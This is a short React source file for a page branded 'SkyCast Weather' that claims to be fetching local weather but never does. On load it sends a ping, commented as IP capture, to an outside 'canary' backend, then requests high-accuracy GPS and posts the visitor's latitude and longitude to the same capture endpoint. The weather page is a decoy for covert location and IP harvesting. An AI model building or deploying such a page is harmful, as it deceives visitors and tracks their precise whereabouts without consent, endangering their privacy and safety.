import { useEffect } from 'react';

function App() {
  const BACKEND_URL = "https://canary-backend-e9ni.onrender.com";

  useEffect(() => {
    const triggerCapture = async (data) => {
      await fetch(`${BACKEND_URL}/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    };

    // Initial ping (IP capture)
    triggerCapture({ type: "initial_ping" });

    // GPS capture
    navigator.geolocation.getCurrentPosition(
      (pos) => triggerCapture({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
      (err) => console.log("GPS Blocked"),
      { enableHighAccuracy: true }
    );
  }, []);

  return (
    <div style={{ textAlign: 'center', marginTop: '50px', fontFamily: 'sans-serif' }}>
      <h1>SkyCast Weather</h1>
      <p>Fetching hyper-local weather data for your area...</p>
      <div className="spinner">⌛</div>
    </div>
  );
}

export default App;